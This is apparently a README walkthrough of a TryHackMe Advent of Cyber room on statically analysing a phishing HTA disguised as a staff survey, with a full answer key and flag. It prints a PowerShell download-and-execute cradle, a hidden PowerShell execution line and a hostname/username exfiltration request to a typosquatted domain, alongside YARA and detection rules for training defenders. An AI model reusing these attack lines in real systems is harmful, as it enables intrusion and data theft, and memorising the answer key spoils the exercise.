# 🎄 TryHackMe Advent of Cyber 2025 - Day 21: Malware Analysis - Malhare.exe

![TryHackMe](https://img.shields.io/badge/TryHackMe-AoC%202025-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Duration](https://img.shields.io/badge/Duration-60%20Minutes-blue?style=for-the-badge)
![Topic](https://img.shields.io/badge/Topic-Malware%20Analysis-darkred?style=for-the-badge)
![Format](https://img.shields.io/badge/Format-HTA%20Files-purple?style=for-the-badge)

---

## 🎯 Overview

**Room**: Advent of Cyber 2025 - Day 21  
**Title**: Malware Analysis - Malhare.exe  
**Topic**: Static Analysis of HTA Malware  
**Difficulty**: Medium  
**Duration**: 60 minutes  
**Analysis Type**: Static (code review without execution)

Learn to analyze malicious HTA (HTML Application) files using static analysis techniques. Discover how attackers disguise malware as legitimate documents, identify obfuscation layers, trace data exfiltration, and decode multi-layered payloads.

⚠️ **IMPORTANT**: This room contains actual malware samples. Use only the provided AttackBox and never execute HTA files directly—always use a text editor.

---

## 📖 The Story

### 📧 The Salary Survey That Wasn't

In Wareville's digital kingdom, thousands of files flow through systems daily: resumes, financial reports, spreadsheets, and executables. But which ones are malicious?

**The TBFC SOC team discovered a pattern**: Several elves' laptops had been compromised. The common thread? They all completed a **"salary survey"** they received via email.

**The attack**:
- Email appeared to be from TBFC HR
- Contained an HTA attachment: "survey.hta"
- Promised participants a chance to win a trip
- Looked completely legitimate with professional branding

**Reality**: The survey was a trojan horse delivering King Malhare's malware.

**Your mission**: Reverse-engineer the HTA file and uncover how King Malhare tricked the elves into executing malicious code.

---

## 🎓 Learning Objectives

By completing this challenge, you will:

- ✅ Understand what **HTA files** are and their legitimate purposes
- ✅ Learn how attackers **weaponize HTAs** for malware delivery
- ✅ Master **static malware analysis** techniques
- ✅ Identify **obfuscation methods** (Base64, ROT13, typosquatting)
- ✅ Trace **network communications** and data exfiltration
- ✅ Recognize **social engineering** tactics in malicious code
- ✅ Use **CyberChef** for decoding payloads
- ✅ Apply **MITRE ATT&CK** framework to real malware

---

## 📄 Understanding HTA Files

### What is an HTA File?

**HTA (HTML Application)** = Desktop app built with web technologies

**Components**:
- 🌐 **HTML**: Structure and content
- 🎨 **CSS**: Styling and layout
- ⚙️ **JavaScript/VBScript**: Logic and functionality

**Key Difference**: HTAs run via `mshta.exe` (Windows built-in), not in a browser. This gives them **full system access** like regular executables.

### Legitimate Uses

| Use Case | Description | Example |
|----------|-------------|---------|
| **Admin automation** | Quick IT task scripts | Password reset tools |
| **Setup utilities** | Installation wizards | Software configuration |
| **Internal interfaces** | Simple GUIs for scripts | Database query tools |
| **Prototyping** | Test concepts quickly | Mockup applications |
| **Support tools** | Lightweight utilities | Network diagnostics |

**Why they exist**: Blend web development simplicity with desktop application power.

### Real-World Threat: Epsilon Red (2025)

**Summer 2025**: Ransomware groups used HTAs disguised as verification pages to spread **Epsilon Red ransomware**, affecting many organizations.

---

## 🔧 HTA File Structure

### Three Main Parts

```html
<html>
<head>
    <!-- 1. HTA DECLARATION -->
    <title>Application Name</title>
    <HTA:APPLICATION 
        ID="AppID"
        APPLICATIONNAME="Name"
        BORDER="thin"
        CAPTION="yes"
    />
</head>

<body>
    <!-- 2. INTERFACE (HTML/CSS) -->
    <h3>Welcome Message</h3>
    <button onclick="doSomething()">Click Me</button>
</body>

<!-- 3. SCRIPT (VBScript/JavaScript) -->
<script language="VBScript">
    Sub doSomething()
        MsgBox "Hello!"
    End Sub
</script>
</html>
```

---

## 🦠 Weaponizing HTAs

### Malicious Purposes

| Purpose | Description | Example |
|---------|-------------|---------|
| **Initial Access** | Entry point via phishing | Email attachment opens HTA |
| **Downloader/Dropper** | Fetches additional payloads | Downloads stage 2 from C2 |
| **Obfuscation** | Hides malicious intent | Base64-encoded PowerShell |
| **Living-off-the-Land** | Uses built-in Windows tools | Calls `powershell.exe`, `wscript.exe` |

### Malicious HTA Example

```html
<html>
  <head>
    <title>Angry King Malhare</title>
    <HTA:APPLICATION ID="Malhare" 
        SHOWINTASKBAR="no"          <!-- Hidden from taskbar -->
        WINDOWSTATE="minimize">     <!-- Runs minimized -->
    </HTA:APPLICATION>
    
    <script language="VBScript">
      Set a = CreateObject("WScript.Shell")
      b = "powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
           {$U = [System.Text.Encoding]::UTF8.GetString(
                 [System.Convert]::FromBase64String('aHR0cHM6...'))
            $C = (Invoke-WebRequest -Uri $U).Content
            $B = [scriptblock]::Create($C)
            $B}"""
      a.Run b, 0, True
      self.close
    </script>
  </head>
</html>
```

### Key Malicious Elements

| Element | Red Flag | Purpose |
|---------|----------|---------|
| `SHOWINTASKBAR="no"` | 🚩 Stealth | User doesn't see it running |
| `WINDOWSTATE="minimize"` | 🚩 Stealth | Window hidden |
| `powershell -ExecutionPolicy Bypass` | 🚩 Evasion | Bypasses security policy |
| `FromBase64String(...)` | 🚩 Obfuscation | Hides malicious URL |
| `Invoke-WebRequest` | 🚩 C2 Communication | Downloads payload |
| `[scriptblock]::Create()` | 🚩 Execution | Runs downloaded code |

---

## 🔍 Static Analysis Process

### Three-Step Framework

```
Step 1: Identify Script Sections
        ↓
        Look for <script language="VBScript">
        Find function definitions (Function, Sub)

Step 2: Look for Encoded Data
        ↓
        Base64 strings
        HTTP/HTTPS URLs
        CreateObject() calls

Step 3: Follow the Logic
        ↓
        Trace variable flow
        Identify execution points
        Map data exfiltration
```

---

## 🚀 Complete Walkthrough

### Phase 1: Safe File Opening

⚠️ **CRITICAL**: Never execute HTA files directly!

```bash
# Open in text editor (AttackBox)
pluma /root/Rooms/AoC2025/Day21/survey.hta
```

**Why text editor?** Viewing source code is safe; executing is not.

---

### Phase 2: Metadata Analysis

**Locate the `<head>` section**:

```html
<head>
    <title>Best Festival Company Developer Survey</title>
    <HTA:APPLICATION ...>
</head>
```

**Findings**:
- ✅ **Title**: "Best Festival Company Developer Survey"
- ✅ **Social Engineering**: Uses TBFC branding for legitimacy
- ✅ **Deception**: Appears to be internal HR survey

---

### Phase 3: Function Identification

**Search for**: `<script type="text/vbscript">`

**Five Functions Discovered**:

| Function | Trigger | Purpose |
|----------|---------|---------|
| `window_onLoad` | Auto-executes on load | Calls `getQuestions()` |
| `getQuestions()` | Called by window_onLoad | Downloads "questions", decodes, calls `provideFeedback()` |
| `provideFeedback(feedbackString)` | Called by getQuestions | Gathers system info, exfiltrates data, **executes payload** |
| `decodeBase64(base64)` | Called as needed | Converts Base64 to binary |
| `RSBinaryToString(xBinary)` | Called as needed | Converts binary to string |

**Execution Flow**:
```
HTA Opens → window_onLoad() → getQuestions() → provideFeedback() → Payload Execution
```

---

### Phase 4: Dangerous Objects

**Search for**: `CreateObject()`

**Three Dangerous Objects Found**:

| Object | Capability | Risk Level |
|--------|------------|------------|
| `InternetExplorer.Application` | Makes web requests | 🔴 C2 communication |
| `WScript.Network` | Accesses network info | 🟠 System enumeration |
| `WScript.Shell` | Executes commands | 🔴 Payload execution |

---

### Phase 5: User Interface Analysis

**Locate**: `<body>` section (starts around line 169)

```html
<body>
    <h2>Best Festival Company Developer Survey</h2>
    <p>Help us improve by answering 4 quick questions!</p>
    <p><strong>Complete for a chance to win a trip to the South Pole!</strong></p>
    
    <!-- Question 1: Job satisfaction -->
    <!-- Question 2: Work-life balance -->
    <!-- Question 3: Compensation fairness -->
    <!-- Question 4: Career development -->
</body>
```

**Social Engineering Tactics**:
- ✅ Professional appearance
- ✅ Legitimate-sounding questions (4 questions total)
- ✅ Incentive: "Win a trip to the **South Pole**!"
- ✅ Creates false sense of trust

---

### Phase 6: Network Analysis

#### Domain Investigation

**Question Download Domain**:
```
survey.bestfestiivalcompany.com
```

🚩 **TYPOSQUATTING DETECTED**:
- Legitimate: `bestfestivalcompany.com`
- Malicious: `bestfestiivalcompany.com`
- **Extra character**: `i` (second "i" in "festiival")

#### Data Exfiltration

**Endpoint**: `/details`

**HTTP Method**: `GET`

**Data Exfiltrated**:
```vbscript
ComputerName  ' Victim's hostname
UserName      ' Victim's username
```

**Exfiltration URL Structure**:
```
GET http://survey.bestfestiivalcompany.com/details?computer=HOSTNAME&user=USERNAME
```

---

### Phase 7: Malicious Execution Point

**Critical Code Line**:
```vbscript
runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```

**Breakdown**:

| Parameter | Meaning | Purpose |
|-----------|---------|---------|
| `powershell.exe` | Launches PowerShell | Execution engine |
| `-nop` | No profile | Faster, stealthier |
| `-w hidden` | Hidden window | User doesn't see |
| `-c` | Execute command | Run the payload |
| `feedbackString` | Downloaded content | Malicious script |
| `0` | Window style (hidden) | No visible window |
| `False` | Don't wait for completion | Run async |

---

### Phase 8: Payload Decoding

#### Download the Payload

From task files, download the malicious payload that the HTA would have fetched.

#### Layer 1: Base64 Encoding

**Detection**: Long alphanumeric string

**Decoding**:
```bash
# Command line
base64 -d payload.txt > decoded.txt

# Or use CyberChef: "From Base64" operation
```

**Result**: Still obfuscated text (ROT13)

#### Layer 2: ROT13 Cipher

**Detection**: Decoded output looks scrambled but has patterns

**CyberChef Recipe**:
```
1. From Base64
2. ROT13
```

**Final Output**:
```
Flag: THM{Malware.Analysed}
```

---

## 🎯 Flags & Answers

| Question | Answer |
|----------|--------|
| What is the title of the HTA application? | `Best Festival Company Developer Survey` |
| What VBScript function is acting as if it is downloading the survey questions? | `getQuestions` |
| What URL domain (including sub-domain) is the "questions" being downloaded from? | `survey.bestfestiivalcompany.com` |
| What character in the domain gives away the typosquatting? | `i` |
| How many questions does the survey have? | `4` |
| The survey entices participation by promising a chance to win a trip to where? | `South Pole` |
| What two pieces of information about the computer are being exfiltrated? | `ComputerName,UserName` |
| What endpoint is the enumerated data being exfiltrated to? | `/details` |
| What HTTP method is being used to exfiltrate the data? | `GET` |
| What is the line of code that executes the contents of the download? | `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False` |
| What popular encoding scheme was used to obfuscate the download? | `base64` |
| What common encryption scheme was used in the script? | `rot13` |
| What is the flag value? | `THM{Malware.Analysed}` |

---

## ⚙️ Attack Flow Analysis

### Complete Attack Chain

```
┌─────────────────────────────────────────────────────┐
│  1. DELIVERY PHASE                                  │
├─────────────────────────────────────────────────────┤
│  • Phishing email to elves                          │
│  • Attachment: survey.hta                           │
│  • Subject: "Developer Satisfaction Survey"         │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  2. SOCIAL ENGINEERING                              │
├─────────────────────────────────────────────────────┤
│  • Professional TBFC branding                       │
│  • Legitimate-looking questions                     │
│  • Incentive: Win trip to South Pole                │
│  • Creates false trust                              │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  3. EXECUTION PHASE                                 │
├─────────────────────────────────────────────────────┤
│  • User opens survey.hta                            │
│  • window_onLoad() triggers automatically           │
│  • getQuestions() executes                          │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  4. C2 COMMUNICATION                                │
├─────────────────────────────────────────────────────┤
│  • Connects to survey.bestfestiivalcompany.com      │
│  • Downloads "questions" (actually malicious script)│
│  • Base64 + ROT13 obfuscation                       │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  5. ENUMERATION                                     │
├─────────────────────────────────────────────────────┤
│  • Gathers ComputerName                             │
│  • Gathers UserName                                 │
│  • Prepares data for exfiltration                   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  6. EXFILTRATION                                    │
├─────────────────────────────────────────────────────┤
│  • Sends data via GET request                       │
│  • Endpoint: /details                               │
│  • Attacker receives victim information             │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  7. PAYLOAD EXECUTION                               │
├─────────────────────────────────────────────────────┤
│  • Launches hidden PowerShell                       │
│  • Executes downloaded script in memory             │
│  • No files written to disk                         │
└─────────────────────────────────────────────────────┘
```

---

## 🚩 IOCs and MITRE ATT&CK

### Indicators of Compromise

| Type | Value | Description |
|------|-------|-------------|
| **Filename** | `survey.hta` | Malicious HTA file |
| **Title** | `Best Festival Company Developer Survey` | Deceptive title |
| **Domain** | `survey.bestfestiivalcompany.com` | Typosquatted C2 domain |
| **Typosquatting** | Extra `i` in "festiival" | Deception technique |
| **Endpoint** | `/details` | Data exfiltration endpoint |
| **HTTP Method** | `GET` | Exfiltration method |
| **Process** | `mshta.exe` | HTA execution |
| **Child Process** | `powershell.exe -nop -w hidden` | Payload launcher |
| **Encoding** | Base64 | First obfuscation layer |
| **Cipher** | ROT13 | Second obfuscation layer |

### MITRE ATT&CK Mapping

| Tactic | Technique | ID | Implementation |
|--------|-----------|-----|----------------|
| **Initial Access** | Phishing: Spearphishing Attachment | T1566.001 | Email with HTA attachment |
| **Execution** | User Execution: Malicious File | T1204.002 | User opens survey.hta |
| **Execution** | Command and Scripting Interpreter: PowerShell | T1059.001 | Hidden PowerShell execution |
| **Defense Evasion** | Masquerading | T1036 | Disguised as legitimate survey |
| **Defense Evasion** | Obfuscated Files or Information | T1027 | Base64 + ROT13 encoding |
| **Discovery** | System Information Discovery | T1082 | ComputerName, UserName enumeration |
| **Exfiltration** | Exfiltration Over Web Service | T1567 | Data sent to attacker's server via GET |

---

## 🛡️ Defense Strategies

### Email Security

```yaml
Prevention:
  - Block .hta attachments at gateway
  - Implement SPF, DKIM, DMARC
  - Sandbox suspicious attachments
  - Train users on phishing recognition

Detection:
  - Monitor for .hta attachments
  - Flag emails with typosquatted domains
  - Alert on incentive-based phishing
```

### Endpoint Protection

```powershell
# Monitor mshta.exe execution
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    ID=1
} | Where-Object {$_.Properties[4].Value -like '*mshta.exe*'}

# Detect hidden PowerShell
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} | Where-Object {$_.Message -like '*-w hidden*'}

# AppLocker rule to block mshta.exe
New-AppLockerPolicy -RuleType Path `
    -Path "C:\Windows\System32\mshta.exe" `
    -Action Deny
```

### Network Monitoring

```
DNS Monitoring:
  - Detect typosquatted domains
  - Alert on suspicious TLDs
  - Monitor for newly registered domains

HTTP Monitoring:
  - Inspect GET requests to /details
  - Monitor for Base64 in URLs
  - Track connections to unknown domains
```

### YARA Rule Example

```yara
rule Malicious_HTA_Survey {
    meta:
        description = "Detects malicious HTA survey files"
        author = "TBFC SOC"
        date = "2025-12-21"
    
    strings:
        $hta1 = "<HTA:APPLICATION" nocase
        $vbs1 = "CreateObject(\"WScript.Shell\")" nocase
        $ps1 = "powershell" nocase
        $ps2 = "-ExecutionPolicy Bypass" nocase
        $enc1 = "FromBase64String" nocase
        $web1 = "Invoke-WebRequest" nocase
        
    condition:
        $hta1 and $vbs1 and $ps1 and ($ps2 or $enc1 or $web1)
}
```

---

## 💡 Key Takeaways

✅ **HTA files** are legitimate but easily weaponized for malware delivery

✅ **Static analysis** examines code without execution—always safer

✅ **Typosquatting** uses similar domains to deceive users (extra/missing characters)

✅ **Social engineering** makes malware appear trustworthy (surveys, prizes, branding)

✅ **Multi-layer obfuscation** (Base64 + ROT13) hides malicious payloads

✅ **PowerShell** is commonly used for in-memory payload execution

✅ **Data exfiltration** happens silently before users realize infection

✅ **CreateObject() calls** in VBScript indicate potentially dangerous operations

✅ **Metadata matters**: Title, application name, window properties reveal intent

✅ **Defense requires** email filtering, endpoint protection, network monitoring, and user training

---

## 📚 Tools and Commands

### Analysis Tools

| Tool | Purpose | Location |
|------|---------|----------|
| **Pluma** | Text editor (safe viewing) | Pre-installed on AttackBox |
| **CyberChef** | Encoding/decoding | https://gchq.github.io/CyberChef/ |
| **Any.run** | Sandbox analysis | https://any.run |
| **VirusTotal** | Multi-AV scanning | https://virustotal.com |

### Essential Commands

```bash
# Open HTA safely in text editor
pluma /root/Rooms/AoC2025/Day21/survey.hta

# Decode Base64 (command line)
base64 -d payload.txt > decoded.txt

# Search for specific strings
grep -i "CreateObject" survey.hta
grep -i "powershell" survey.hta

# Count functions
grep -c "^Function\|^Sub" survey.hta
```

---

## 🔗 Related Rooms

Continue your malware analysis journey:

- **MalDoc: Static Analysis**: Analyze malicious Office documents
- **Basic Malware RE**: Introduction to reverse engineering
- **YARA**: Create detection rules for malware
- **Phishing Analysis**: Identify and analyze phishing campaigns
- **Threat Intelligence**: Understand APT tactics and IOCs

---

## 🤝 Contributing

Improvements welcome!

1. Fork this repository
2. Create feature branch
3. Commit changes
4. Push and open Pull Request

---

## 📄 License

Educational purposes - TryHackMe Advent of Cyber 2025

---

## 🙏 Acknowledgments

- **TryHackMe** for Advent of Cyber 2025
- **GCHQ** for CyberChef
- The malware analysis community

---

**🎄 Stay Safe! Analyze Carefully! 🔍**

*Remember: Never execute suspicious files. Static analysis first, dynamic analysis in sandbox only.*
